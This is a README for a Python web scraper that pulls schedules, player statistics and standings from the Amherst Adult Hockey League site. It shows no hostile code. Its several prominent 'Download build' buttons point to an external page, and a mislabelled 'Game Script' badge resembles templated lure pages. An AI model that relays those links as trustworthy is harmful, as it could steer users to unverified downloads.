# AAHL Scraper v2026 - Amherst Hockey League Web Scraper

> **Python-based scraper for the Amherst Adult Hockey League website.** Retrieve game schedules, individual player statistics, and team standings through either direct HTTP requests or Playwright browser automation.

[![Game Script](https://img.shields.io/badge/Type-Web%20Scraper-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carter-hallxpbk8368/aahl-web-scraper?style=flat-square)](https://github.com/carter-hallxpbk8368/aahl-web-scraper)

---

<p align="center">
  <a href="https://carter-hallxpbk8368.github.io/aahl-web-scraper/">
    <img src="https://img.shields.io/badge/Download-AAHL%20Scraper%20Script-brightgreen?style=for-the-badge" alt="Download AAHL Scraper Script">
  </a>
</p>

> **[Download AAHL Scraper](https://carter-hallxpbk8368.github.io/aahl-web-scraper/)**

---

[Download Latest Build](https://carter-hallxpbk8368.github.io/aahl-web-scraper/)

---

## What It Does

AAHL Scraper gathers information published on the Amherst Adult Hockey League website and turns it into structured, reusable data. The utility can retrieve schedules, player statistics, and team standings for easier viewing, storage, and use in other applications.

Two scraping approaches are available: standard HTTP requests and a Playwright-powered backend for pages that need browser automation. BeautifulSoup handles HTML parsing, while JSON and CSV export options make it straightforward to save the collected results. Backend diagnostics are included to help investigate scraping issues.

## Capabilities

- Retrieves league schedules, player statistics, and team standings
- Provides both HTTP request and Playwright scraping backends
- Parses returned HTML with BeautifulSoup
- Saves results in JSON format
- Saves results in CSV format
- Offers diagnostic output for backend troubleshooting
- Runs as a command-line utility
- Provides a Python API for integration into other code

## Getting Started

1. Download the newest build using the project link above.
2. Copy the repository contents into a working directory, for example `aahl-scraper-2026`.
3. Install the Python packages required by the backend you plan to use.
4. Launch the scraper through the CLI or import it into a Python application.

Run it from the command line with:

    python main.py

Or call it from Python:

    from aahl_scraper import scraper
    data = scraper.run()

If your local checkout uses a different file structure, update the entry point accordingly.

## Configuration and Modes

The scraper can be directed through command-line arguments or through configuration values defined in code.

| Option | Purpose |
| --- | --- |
| `backend=http` | Retrieve pages with standard HTTP requests |
| `backend=playwright` | Use browser automation for dynamic content |
| `export=json` | Save the collected data as JSON |
| `export=csv` | Save the collected data as CSV |
| `diagnostics=true` | Display backend diagnostic information |
| `mode=cli` | Operate through the command line |
| `mode=api` | Access the scraper through its Python interface |

For example:

    backend = "playwright"
    export_format = "json"
    diagnostics = True

## Python and Website Compatibility

AAHL Scraper targets Python environments and the Amherst Adult Hockey League website. The appropriate backend depends on how each target page is served: some pages may be accessible with HTTP requests, while others may need Playwright.

Results can also depend on the current site structure, whether the required browser runtime is available, and the versions of installed Python packages. Changes to the website layout may require corresponding updates to selectors and parsing logic.

## Frequently Asked Questions

**What is the quickest way to begin?**  
Download the project, install its Python dependencies, then run the main entry point or import the package into your own Python program.

**Are multiple scraping backends included?**  
Yes. You can select either the HTTP request backend or the Playwright backend.

**Which export formats can I use?**  
The scraper supports both JSON and CSV output.

**Can I use it without the command line?**  
Yes. AAHL Scraper includes a Python API as well as its CLI, allowing it to be embedded in other Python workflows.

**How should I respond to a changed website layout?**  
Review and update the parsing rules or backend configuration so they correspond to the current page structure.

**Where can the generated files go?**  
Choose any local directory that suits your workflow, and direct the JSON or CSV output to the desired path.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
